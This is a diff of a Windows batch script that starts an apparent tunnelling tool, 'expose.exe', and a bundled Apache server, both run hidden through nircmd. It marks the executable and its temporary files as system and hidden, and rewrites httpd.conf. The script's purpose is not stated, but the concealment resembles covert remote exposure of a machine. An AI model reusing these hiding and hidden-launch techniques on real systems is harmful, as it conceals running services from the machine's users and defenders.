@@ -39,15 +39,22 @@ if "%ERRORLEVEL%" equ "0" (
 )
 
 attrib -s -h -i "%environment%\expose.exe"
-if exist "%environment%\expose.exe" (
-   tasklist /fi "imagename eq expose.exe" | find /i "expose.exe" > nul
+tasklist /fi "imagename eq expose.exe" | find /i "expose.exe" > nul
 if not errorlevel 1 (attrib +s +h +i "%environment%\expose.exe") else (attrib -s -h -i "%temp%\expose.bat" && attrib -s -h -i "%temp%\expose.txt" && echo ^%environment%\expose.exe %port%^ ^>^ ^%temp%\expose.txt^ > "%temp%\expose.bat" && "%environment%\nircmd.exe" exec hide "%temp%\expose.bat" && timeout -t 5 && attrib +s +h +i "%environment%\expose.exe" && attrib +s +h +i "%temp%\expose.txt" && attrib +s +h +i "%temp%\expose.bat"
 )
+
+set "search=REPLACE"
+set "replace=%environment%"
+
+set "httpdconf=%environment%\apache2\conf\httpd.conf"
+
+for /f "delims=" %%i in ('type "%httpdconf%" ^& break ^> "%httpdconf%" ') do (
+set "line=%%i"
+>>"%httpdconf%" echo(!line:%search%=%replace%!
 )
 
-if exist "%environment%\apache2\bin\httpd.exe" (tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
+tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
 if not errorlevel 1 (echo.) else (reg add "HKCU\Environment" /v environment /t REG_SZ /d "%environment%" /f && "%environment%\nircmd.exe" exec hide "%environment%\apache2\bin\httpd.exe" && reg delete "HKCU\Environment" /v environment /f)
-)
 
 reg delete "HKCU\Environment" /v port /f
 
